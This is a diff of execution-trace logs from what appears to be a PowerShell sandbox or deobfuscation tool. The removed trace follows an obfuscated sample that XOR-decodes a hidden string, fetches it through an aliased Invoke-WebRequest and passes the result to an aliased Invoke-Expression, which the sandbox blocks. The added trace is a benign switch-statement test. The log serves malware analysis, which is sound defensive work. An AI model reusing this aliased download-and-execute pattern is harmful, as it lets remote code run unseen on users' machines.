-[19:41:53.874] --- Node 12 [Condition] ---
-[19:41:53.875]   Code: [bool]($x -lt $b.Count)
-[19:41:53.880]   Status: OK
-[19:41:53.881]   VarsRead:
-[19:41:53.881]     $x = 28
-[19:41:53.881]     $b = [Object[]] Count=33
-[19:41:53.882]   Result: @(True)
-[19:41:53.882]   ConditionResult: True
-[19:41:53.883] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.883]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.892]   Status: OK
-[19:41:53.893]   VarsRead:
-[19:41:53.893]     $x = 28
-[19:41:53.894]     $B = [Object[]] Count=33
-[19:41:53.894]   VarsWritten:
-[19:41:53.894]     $B = [Object[]] Count=33
-[19:41:53.895] --- Node 14 [ForIter] ---
-[19:41:53.895]   Code: $x++
-[19:41:53.896]   Status: OK
-[19:41:53.896]   VarsRead:
-[19:41:53.897]     $x = 28
-[19:41:53.897]   VarsWritten:
-[19:41:53.897]     $x = 29
-[19:41:53.898] --- Node 12 [Condition] ---
-[19:41:53.898]   Code: [bool]($x -lt $b.Count)
-[19:41:53.904]   Status: OK
-[19:41:53.904]   VarsRead:
-[19:41:53.905]     $x = 29
-[19:41:53.905]     $b = [Object[]] Count=33
-[19:41:53.905]   Result: @(True)
-[19:41:53.906]   ConditionResult: True
-[19:41:53.906] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.907]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.914]   Status: OK
-[19:41:53.915]   VarsRead:
-[19:41:53.915]     $x = 29
-[19:41:53.915]     $B = [Object[]] Count=33
-[19:41:53.916]   VarsWritten:
-[19:41:53.916]     $B = [Object[]] Count=33
-[19:41:53.916] --- Node 14 [ForIter] ---
-[19:41:53.918]   Code: $x++
-[19:41:53.920]   Status: OK
-[19:41:53.920]   VarsRead:
-[19:41:53.920]     $x = 29
-[19:41:53.921]   VarsWritten:
-[19:41:53.921]     $x = 30
-[19:41:53.921] --- Node 12 [Condition] ---
-[19:41:53.922]   Code: [bool]($x -lt $b.Count)
-[19:41:53.927]   Status: OK
-[19:41:53.927]   VarsRead:
-[19:41:53.928]     $x = 30
-[19:41:53.928]     $b = [Object[]] Count=33
-[19:41:53.928]   Result: @(True)
-[19:41:53.929]   ConditionResult: True
-[19:41:53.929] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.929]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.938]   Status: OK
-[19:41:53.938]   VarsRead:
-[19:41:53.939]     $x = 30
-[19:41:53.939]     $B = [Object[]] Count=33
-[19:41:53.939]   VarsWritten:
-[19:41:53.940]     $B = [Object[]] Count=33
-[19:41:53.940] --- Node 14 [ForIter] ---
-[19:41:53.940]   Code: $x++
-[19:41:53.942]   Status: OK
-[19:41:53.942]   VarsRead:
-[19:41:53.942]     $x = 30
-[19:41:53.943]   VarsWritten:
-[19:41:53.943]     $x = 31
-[19:41:53.943] --- Node 12 [Condition] ---
-[19:41:53.944]   Code: [bool]($x -lt $b.Count)
-[19:41:53.950]   Status: OK
-[19:41:53.951]   VarsRead:
-[19:41:53.951]     $x = 31
-[19:41:53.951]     $b = [Object[]] Count=33
-[19:41:53.952]   Result: @(True)
-[19:41:53.952]   ConditionResult: True
-[19:41:53.953] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.953]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.962]   Status: OK
-[19:41:53.962]   VarsRead:
-[19:41:53.962]     $x = 31
-[19:41:53.963]     $B = [Object[]] Count=33
-[19:41:53.963]   VarsWritten:
-[19:41:53.963]     $B = [Object[]] Count=33
-[19:41:53.964] --- Node 14 [ForIter] ---
-[19:41:53.964]   Code: $x++
-[19:41:53.965]   Status: OK
-[19:41:53.966]   VarsRead:
-[19:41:53.966]     $x = 31
-[19:41:53.966]   VarsWritten:
-[19:41:53.967]     $x = 32
-[19:41:53.967] --- Node 12 [Condition] ---
-[19:41:53.968]   Code: [bool]($x -lt $b.Count)
-[19:41:53.973]   Status: OK
-[19:41:53.973]   VarsRead:
-[19:41:53.974]     $x = 32
-[19:41:53.974]     $b = [Object[]] Count=33
-[19:41:53.974]   Result: @(True)
-[19:41:53.975]   ConditionResult: True
-[19:41:53.975] --- Node 15 [AssignmentStatementAst] ---
-[19:41:53.976]   Code: ${B}[${x}] = ${B}[${X}] -bxor 37
-[19:41:53.985]   Status: OK
-[19:41:53.985]   VarsRead:
-[19:41:53.986]     $x = 32
-[19:41:53.986]     $B = [Object[]] Count=33
-[19:41:53.986]   VarsWritten:
-[19:41:53.987]     $B = [Object[]] Count=33
-[19:41:53.987] --- Node 14 [ForIter] ---
-[19:41:53.988]   Code: $x++
-[19:41:53.989]   Status: OK
-[19:41:53.989]   VarsRead:
-[19:41:53.990]     $x = 32
-[19:41:53.990]   VarsWritten:
-[19:41:53.990]     $x = 33
-[19:41:53.991] --- Node 12 [Condition] ---
-[19:41:53.991]   Code: [bool]($x -lt $b.Count)
-[19:41:53.996]   Status: OK
-[19:41:53.997]   VarsRead:
-[19:41:53.997]     $x = 33
-[19:41:53.997]     $b = [Object[]] Count=33
-[19:41:53.998]   Result: @(False)
-[19:41:53.998]   ConditionResult: False
-[19:41:53.999] --- Node 13 [LoopEnd] ---
-[19:41:54.000]   Code: End For
-[19:41:54.000]   Status: SKIP
-[19:41:54.001] --- Node 16 [PipelineElement] ---
-[19:41:54.001]   Code: Write-Host "xxx"
-[19:41:54.002]   Status: OK
-[19:41:54.003] --- Node 17 [AssignmentStatementAst] ---
-[19:41:54.003]   Code: $c = (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content
-[19:42:01.069]   [ALIAS] Recorded: input -> Invoke-WebRequest
-[19:42:01.069]   [BLOCKED] Forbidden command: Invoke-WebRequest (original: input)
-[19:42:01.070]   [BLOCKED] Set $c = [BlockedPlaceholder]
-[19:42:01.070]   Status: BLOCKED
-[19:42:01.071]   Action: Blocked
-[19:42:01.072]   Reason: Forbidden command
-[19:42:01.073] --- Node 18 [PipelineElement] ---
-[19:42:01.073]   Code: output $c
-[19:42:01.073]   [ALIAS] Recorded: output -> Invoke-Expression
-[19:42:01.074]   [DYNAMIC] Dynamic invoke detected: Invoke-Expression
-[19:42:01.077]   [DYNAMIC] Type: IEX
-[19:42:01.077]   [DYNAMIC] Cannot resolve argument to string, falling back to direct execution
-[19:42:01.102]   Status: ERR
-[19:42:01.102]   Action: DynamicInvoke
-[19:42:01.102]   VarsRead:
-[19:42:01.103]     $c = [BlockedCommandPlaceholder]
-[19:42:01.103]   Error: The term '__BLOCKED_PLACEHOLDER__' is not recognized as a name of a cmdlet, function, script file, or executable program.
-Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
-[19:42:01.104] --- Node 4 [MainEnd] ---
-[19:42:01.104]   Code: End Main Script
-[19:42:01.104]   Status: SKIP
-[19:42:01.105] === 执行结束 ===
-[19:42:01.105] 
-[19:42:01.105] === 执行统计 ===
-[19:42:01.106] Total visits: 114
-[19:42:01.106] Unique nodes: 17
+[19:26:18.393] === CFG 执行开始 ===
+[19:26:18.393] MaxIterations: 1000, MaxTotalNodes: 50000
+[19:26:18.394] 
+[19:26:18.394] === 初始化子图映射 ===
+[19:26:18.394]   [INIT] Total functions: 0, ScriptBlocks: 0
+[19:26:18.395] 
+[19:26:18.395] --- Node 1 [Start] ---
+[19:26:18.396]   Code: Script Start
+[19:26:18.396]   Status: SKIP
+[19:26:18.397] --- Node 3 [MainStart] ---
+[19:26:18.397]   Code: Main Script
+[19:26:18.397]   Status: SKIP
+[19:26:18.398] --- Node 5 [SwitchStart] ---
+[19:26:18.398]   Code: switch (1, 2, 3, 4, 5)
+[19:26:18.399]   Status: SKIP
+[19:26:18.399] --- Node 6 [SwitchInit] ---
+[19:26:18.400]   Code: $__sw_ae5f91e6c73c = @(1, 2, 3, 4, 5); $__sw_ae5f91e6c73c_idx = 0
+[19:26:18.415]   Status: OK
+[19:26:18.416]   VarsWritten:
+[19:26:18.417]     $__sw_ae5f91e6c73c_idx = 0
+[19:26:18.419]     $__sw_ae5f91e6c73c = @(1, 2, 3, 4, 5)
+[19:26:18.420] --- Node 7 [SwitchCondition] ---
+[19:26:18.420]   Code: [bool]($__sw_ae5f91e6c73c_idx -lt $__sw_ae5f91e6c73c.Count)
+[19:26:18.479]   Status: OK
+[19:26:18.480]   VarsRead:
+[19:26:18.480]     $__sw_ae5f91e6c73c_idx = 0
+[19:26:18.481]     $__sw_ae5f91e6c73c = @(1, 2, 3, 4, 5)
+[19:26:18.481]   Result: @(True)
+[19:26:18.481]   ConditionResult: True
+[19:26:18.483] --- Node 9 [SwitchBind] ---
+[19:26:18.483]   Code: $__sw_ae5f91e6c73c_current = $__sw_ae5f91e6c73c[$__sw_ae5f91e6c73c_idx]
+[19:26:18.511]   Status: OK
+[19:26:18.511]   VarsRead:
+[19:26:18.512]     $__sw_ae5f91e6c73c_idx = 0
+[19:26:18.512]     $__sw_ae5f91e6c73c = @(1, 2, 3, 4, 5)
+[19:26:18.512]   VarsWritten:
+[19:26:18.513]     $__sw_ae5f91e6c73c_current = 1
+[19:26:18.514] --- Node 11 [CaseCondition] ---
+[19:26:18.514]   Code: [bool]($__sw_ae5f91e6c73c_current -eq 1)
+[19:26:18.552]   Status: OK
+[19:26:18.553]   VarsRead:
+[19:26:18.553]     $__sw_ae5f91e6c73c_current = 1
+[19:26:18.554]   Result: @(True)
+[19:26:18.554]   ConditionResult: True
+[19:26:18.556] --- Node 12 [PipelineElement] ---
+[19:26:18.557]   Code: "one"
+[19:26:18.560]   Status: OK
+[19:26:18.561]   Result: @("one")
+[19:26:18.561] --- Node 13 [CaseCondition] ---
+[19:26:18.562]   Code: [bool]($__sw_ae5f91e6c73c_current -eq 2)
+[19:26:18.594]   Status: OK
+[19:26:18.594]   VarsRead:
+[19:26:18.595]     $__sw_ae5f91e6c73c_current = 1
+[19:26:18.595]   Result: @(False)
+[19:26:18.596]   ConditionResult: False
+[19:26:18.597] --- Node 16 [CaseCondition] ---
+[19:26:18.597]   Code: [bool]($__sw_ae5f91e6c73c_current -eq 3)
+[19:26:18.647]   Status: OK
+[19:26:18.647]   VarsRead:
+[19:26:18.648]     $__sw_ae5f91e6c73c_current = 1
+[19:26:18.648]   Result: @(False)
+[19:26:18.648]   ConditionResult: False
+[19:26:18.649] --- Node 19 [CaseCondition] ---
+[19:26:18.650]   Code: [bool]($__sw_ae5f91e6c73c_current -eq 4)
+[19:26:18.689]   Status: OK
+[19:26:18.689]   VarsRead:
+[19:26:18.690]     $__sw_ae5f91e6c73c_current = 1
+[19:26:18.691]   Result: @(False)
+[19:26:18.691]   ConditionResult: False
+[19:26:18.692] --- Node 21 [CaseCondition] ---
+[19:26:18.692]   Code: [bool]($__sw_ae5f91e6c73c_current -eq 5)
+[19:26:18.732]   Status: OK
+[19:26:18.732]   VarsRead:
+[19:26:18.733]     $__sw_ae5f91e6c73c_current = 1
+[19:26:18.733]   Result: @(False)
+[19:26:18.734]   ConditionResult: False
+[19:26:18.742] --- Node 10 [SwitchIter] ---
+[19:26:18.743]   Code: $__sw_ae5f91e6c73c_idx++
+[19:26:18.759]   Status: OK
+[19:26:18.773]   VarsRead:
+[19:26:18.773]     $__sw_ae5f91e6c73c_idx = 0
+[19:26:18.774]   VarsWritten:
+[19:26:18.774]     $__sw_ae5f91e6c73c_idx = 1
+[19:26:18.788] --- Node 7 [SwitchCondition] ---
+[19:26:18.788]   Code: [bool]($__sw_ae5f91e6c73c_idx -lt $__sw_ae5f91e6c73c.Count)
+[19:26:18.810]   Status: OK
+[19:26:18.810]   VarsRead:
+[19:26:18.811]     $__sw_ae5f91e6c73c_idx = 1
+[19:26:18.811]     $__sw_ae5f91e6c73c = @(1, 2, 3, 4, 5)
+[19:26:18.811]   Result: @(True)
+[19:26:18.812]   ConditionResult: True
+[19:26:18.812] --- Node 9 [SwitchBind] ---
+[19:26:18.813]   Code: $__sw_ae5f91e6c73c_current = $__sw_ae5f91e6c73c[$__sw_ae5f91e6c73c_idx]
+[19:26:18.817]   Status: OK
+[19:26:18.817]   VarsRead:
+[19:26:18.817]     $__sw_ae5f91e6c73c_idx = 1
+[19:26:18.818]     $__sw_ae5f91e6c73c = @(1, 2, 3, 4, 5)
+[19:26:18.818]   VarsWritten:
+[19:26:18.819]     $__sw_ae5f91e6c73c_current = 2
+[19:26:18.819] --- Node 11 [CaseCondition] ---
+[19:26:18.819]   Code: [bool]($__sw_ae5f91e6c73c_current -eq 1)
+[19:26:18.827]   Status: OK
+[19:26:18.828]   VarsRead:
+[19:26:18.828]     $__sw_ae5f91e6c73c_current = 2
+[19:26:18.828]   Result: @(False)
+[19:26:18.829]   ConditionResult: False
+[19:26:18.829] --- Node 13 [CaseCondition] ---
+[19:26:18.830]   Code: [bool]($__sw_ae5f91e6c73c_current -eq 2)
+[19:26:18.837]   Status: OK
+[19:26:18.838]   VarsRead:
+[19:26:18.838]     $__sw_ae5f91e6c73c_current = 2
+[19:26:18.839]   Result: @(True)
+[19:26:18.839]   ConditionResult: True
+[19:26:18.840] --- Node 14 [PipelineElement] ---
+[19:26:18.840]   Code: "two"
+[19:26:18.843]   Status: OK
+[19:26:18.843]   Result: @("two")
+[19:26:18.844] --- Node 15 [Exit] ---
+[19:26:18.844]   Code: exit
+[19:26:18.847]   Status: OK
+[19:26:18.848] === 执行结束 ===
+[19:26:18.849] 
+[19:26:18.849] === 执行统计 ===
+[19:26:18.849] Total visits: 19
+[19:26:18.850] Unique nodes: 15
